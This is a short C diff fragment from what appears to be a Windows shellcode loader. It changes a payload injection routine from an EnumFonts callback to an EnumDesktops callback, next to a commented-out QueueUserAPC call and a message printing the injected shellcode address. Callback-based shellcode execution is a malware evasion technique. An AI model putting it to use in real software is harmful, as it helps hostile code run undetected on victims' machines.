@@ -55,7 +55,7 @@ int main()
 
 
 	//QueueUserAPC((PAPCFUNC)pExPayload, hThread1, 0);
-	InjectCallbackPayloadEnumFonts(pPayload_t.pText, (DWORD)pPayload_t.sText, &dwOldProtections, (PVOID*)&pExtPayloadAddres);
+	InjectCallbackPayloadEnumDesktops(pPayload_t.pText, (DWORD)pPayload_t.sText, &dwOldProtections, (PVOID*)&pExtPayloadAddres);
 
 	printf("Injecting Shellcode At Address: 0x%p\n", pExtPayloadAddres);
 	getchar();
